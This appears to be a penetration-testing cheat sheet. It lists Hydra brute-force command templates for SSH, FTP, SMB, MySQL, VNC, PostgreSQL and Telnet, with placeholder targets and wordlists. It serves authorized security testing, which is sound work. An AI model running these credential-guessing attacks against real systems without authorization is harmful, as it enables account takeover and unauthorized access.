# Hydra

% bruteforce, access

## Hydra - SSH brute-force with user and password lists
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -L <userlist> -P <passlist> <ip> ssh
```

## Hydra - SSH brute-force with single user and password
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -l <user> -p <password> <ip> ssh
```

## Hydra - SSH brute-force with user=password
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -e s <ip> ssh
```

## Hydra - SSH brute-force with null password
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -l <user> -e n <ip> ssh
```

## Hydra - SSH brute-force with password=reverseuser
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -e r <ip> ssh
```

## Hydra - SSH brute-force with "login:pass" file and custom port
#plateform/linux #target/remote #protocol/ssh #port/custom #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -t 4 -s <port> -C <file_login_pass> <ip> ssh
```

## Hydra - FTP brute-force
#protocol/ftp #port/21 #plateform/linux #target/remote  #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> ftp
```

## Hydra - SMB brute-force
#protocol/smb #port/445 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> smb
```

## Hydra - MySQL brute-force
#protocol/mysql #port/3306 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> mysql
```

## Hydra - VNC brute-force
#protocol/vnc #port/5900 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> vnc
```

## Hydra - PostgreSQL brute-force
#protocol/postgres #port/5432 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> postgres
```

## Hydra - Telnet brute-force
#protocol/telnet #port/23 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <userlist> -P <passlist> <ip> telnet
```

= userlist: users.txt
= passlist: pass.txt
